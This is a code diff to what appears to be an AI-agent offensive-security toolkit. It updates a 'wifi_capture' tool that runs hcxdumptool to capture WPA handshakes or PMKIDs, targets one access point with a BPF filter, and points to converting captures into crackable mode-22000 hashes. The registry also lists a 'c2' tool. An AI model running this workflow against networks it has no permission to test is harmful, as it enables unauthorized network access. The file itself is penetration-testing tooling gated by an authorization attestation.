@@ -1269,18 +1269,32 @@ def tool_wifi_capture(args: dict) -> str:
     if g:
         return g
     if not iface:
-        return ("wifi_capture: give a monitor-mode 'interface' (e.g. wlan0mon) and the 'bssid' of "
-                "the network YOU are authorized to test. PMKID via hcxdumptool by default.")
+        return ("wifi_capture: give the PHYSICAL 'interface' (e.g. wlan0) and the 'bssid' of the "
+                "network YOU are authorized to test. hcxdumptool (>=7.x) sets monitor mode itself — "
+                "pass the real interface, NOT a wlanXmon virtual one, and do not run airmon-ng first.")
     out_file = str(args.get("out", "/tmp/capture.pcapng")).strip()
     secs = int(args.get("seconds", 60))
+    channel = str(args.get("channel", "")).strip()
     extra = str(args.get("extra", "")).strip()
-    filt = f"--filterlist_ap={shlex.quote(bssid)} --filtermode=2" if bssid else ""
-    cmd = (f"timeout {secs} hcxdumptool -i {shlex.quote(iface)} -w {shlex.quote(out_file)} "
-           f"{filt} {extra}").strip()
+    # hcxdumptool 6.3/7.x: target one AP by compiling a BPF on its BSSID (addr3),
+    # not the removed --filterlist_ap. Frequencies: -c <chan+band e.g. 11a> or -F (all).
+    pre, bpf = "", ""
+    if bssid:
+        mac = re.sub(r"[^0-9a-fA-F]", "", bssid)
+        if len(mac) == 12:
+            pre = f"hcxdumptool --bpfc={shlex.quote('wlan addr3 ' + mac)} > /tmp/_wifi.bpf 2>/dev/null; "
+            bpf = "--bpf=/tmp/_wifi.bpf "
+    freq = f"-c {shlex.quote(channel)} " if channel else "-F "
+    cmd = (f"{pre}timeout {secs} hcxdumptool -i {shlex.quote(iface)} -w {shlex.quote(out_file)} "
+           f"{freq}{bpf}{extra}").strip()
     out, rc, where = _off_run(cmd, secs + 30)
     if rc != 0 and not _have("hcxdumptool"):
-        return "hcxdumptool not installed (`apt install hcxdumptool`); or use airodump-ng via the shell tool."
-    tail = "\n[convert to a crackable hash: hcxpcapngtool -o hash.22000 " + out_file + " ; then the 'crack' tool with mode 22000]"
+        return ("hcxdumptool not installed (`apt install hcxdumptool`), or the adapter lacks "
+                "monitor-mode + frame-injection. Alternative via the shell tool: airmon-ng start "
+                f"{iface}; airodump-ng -c <ch> --bssid {bssid or '<BSSID>'} -w cap {iface}mon.")
+    tail = ("\n[next: hcxpcapngtool -o hash.22000 " + out_file
+            + "  then the 'crack' tool {hashfile:hash.22000, mode:22000, wordlist:...}. "
+            "hcxdumptool + hcxpcapngtool versions must match. WPA3-SAE is not affected.]")
     return _off_report("wifi_capture", args.get("authorization", ""), cmd, out + tail, rc, where)
 
 
@@ -1616,7 +1630,7 @@ BUILTIN_TOOLS: dict[str, dict] = {
     "wifi_capture": {
         "desc": ("Capture a WPA handshake / PMKID on a network YOU are authorized to test "
                  "(hcxdumptool). Requires a monitor-mode 'interface', a 'bssid', and 'authorization'."),
-        "args": {"interface": "monitor-mode iface e.g. wlan0mon", "bssid": "target AP BSSID/SSID you are authorized to test", "authorization": "attestation", "seconds": "capture window (default 60)", "out": "output pcapng path", "extra": "optional flags"},
+        "args": {"interface": "PHYSICAL iface e.g. wlan0 (hcxdumptool sets monitor mode itself)", "bssid": "target AP BSSID/SSID you are authorized to test", "authorization": "attestation", "channel": "optional channel+band e.g. 11a (else all freqs)", "seconds": "capture window (default 60)", "out": "output pcapng path", "extra": "optional flags"},
         "func": tool_wifi_capture,
     },
     "c2": {
